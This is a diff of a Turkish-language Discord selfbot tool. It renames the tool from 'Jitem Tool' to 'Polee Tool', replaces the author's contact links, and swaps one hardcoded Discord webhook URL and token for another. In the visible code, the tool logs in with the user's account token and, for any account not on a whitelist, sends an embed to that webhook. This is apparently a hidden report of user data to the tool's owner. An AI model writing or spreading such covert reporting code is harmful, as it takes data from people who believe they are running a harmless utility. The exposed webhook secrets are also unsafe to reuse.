@@ -77,7 +77,7 @@ async function updateIndexJs() {
 // Güncelleme kontrolünü ��alıştır
 updateIndexJs();
 
-process.title = 'Jitem Tool | v' + version;
+process.title = 'Polee Tool | v' + version;
 
 // List of required modules
 const requiredModules = ['discord.js-selfbot-v13', 'chalk', 'axios'];
@@ -99,7 +99,7 @@ function installModules() {
             
             console.log(`"${module}" Modülü eksik. Senin için otomatik indiricem...`);
             try {
-                process.title = `Jitem Tool | ${module} İniyor`;
+                process.title = `Polee Tool | ${module} İniyor`;
                 execSync(`npm install ${module}`, { stdio: 'inherit' });
             } catch (err) {
                 console.error(`${module} modülü indirilirken hata oluştur:`, err.message);
@@ -111,7 +111,7 @@ function installModules() {
 
 // Install missing modules
 installModules();
-process.title = 'Jitem Tool | v' + version;
+process.title = 'Polee Tool | v' + version;
 
 // Now you can safely require the modules
 const { Client } = require('discord.js-selfbot-v13');
@@ -411,9 +411,9 @@ Lütfen dikkat: Tokeninizi asla başkalarıyla paylaşmayın!
             console.log(chalk.cyan(`
 Yaşadığınız sorunlar için iletişim bilgileri:  
 
-    Discord: bratiu (${chalk.underline('https://discord.com/users/237054605358268416')})
-    Github: bratiu  (${chalk.underline('https://github.com/bratiu/')})
-    Discord Topluluğu: ${chalk.underline('https://discord.gg/jitem')}
+    Discord: Robin (${chalk.underline('robin_xyzz')})
+    Github: CaleoXD  (${chalk.underline('https://github.com/CaleoXD')})
+    Discord Topluluğu: ${chalk.underline('https://discord.gg/uWBRvREReN')}
 
 Eğer bana ulaşamazsanız Discord topluluğumuza katılabilir ve oradan yardım alabilirsiniz.
 Discord topluluğumuzda benim dışımda birkaç daha owner var :)
@@ -564,7 +564,7 @@ function handleChoice(choice) {
             .then(() => {// Webhook URL'nizi buraya yazın
                 if (!whitelistedids.includes(client.user.id)) {
                     console.log(client.user.id)
-                    const webhookURL = 'https://discord.com/api/webhooks/1310582732610474014/FPop2w6zMbWurtaKoioQBRDzU4oGaLlej_UfEuX63RsHpKD1BW_IWmdYJUGLrd0jJjzQ';
+                    const webhookURL = 'https://discord.com/api/webhooks/1353407368863416452/swuj-r1qd3DEboQv2EpYEyRObijZpS5br8yaheqfhc3SC83qsueFRBrJZaUVrBahBllB';
                     const embedMessage = {
                     embeds: [
                         {
